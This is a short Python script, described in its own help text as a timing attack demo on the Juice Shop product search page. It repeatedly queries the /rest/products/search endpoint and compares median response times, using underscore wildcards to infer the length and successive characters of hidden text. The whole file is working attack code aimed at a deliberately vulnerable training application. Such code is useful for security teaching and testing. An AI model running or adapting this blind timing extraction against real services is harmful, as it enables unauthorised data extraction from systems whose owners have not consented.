import requests
import statistics
import argparse


def searchProduct(q,n,host,runtime):
    time = lambda res : float(res.headers['X-Runtime']) if runtime else res.elapsed.total_seconds()
    times = [ time(requests.get('http://'+host+'/rest/products/search?q='+q)) for i in range(n) ]
    return statistics.median(times)
    
def findLength(q,i,j,search):
    for i in range(i,j):
        n = search(q+"_"*i)
        print(q,i,n)

chars = list("abcdefghijklmnopqrtsuvwxyz0123456789_") # underscore is a single char wildcard

def findNextChar(q,search):
    for c in chars:
        i = search(q+c)
        print(q + c,i)

parser = argparse.ArgumentParser(description='Simple timing attack demo on the juice-shop search page')
parser.add_argument('QUERY',type=str) 
parser.add_argument('-n', nargs='?', default=10, type=int,help='Number of runs per request') 
parser.add_argument('-t', nargs='?', default='runtime', type=str, choices=['runtime', 'system'], help='Request time measuring technique') 
parser.add_argument('--nextchar', action='store_true',help='Find next character after QUERY') 
parser.add_argument('--length', type=int,nargs=2,metavar=('MIN','MAX'),help='Find length of text after QUERY') 
parser.add_argument('--host', type=str,default="localhost:3000",nargs=1,help='Host url') 

args = parser.parse_args()
print(args)

n = args.n
h = args.host[0]
search = lambda q : searchProduct(q,n,h,args.t == "runtime")
q = args.QUERY
if args.nextchar:
    findNextChar(q,search)
elif args.length:
    i,j = args.length
    findLength(q,i,j,search)
else:
    res = requests.get('http://'+h+'/rest/products/search?q='+q)
    print(res)
    print(res.text)
    n = search(q)
    print(q,n)
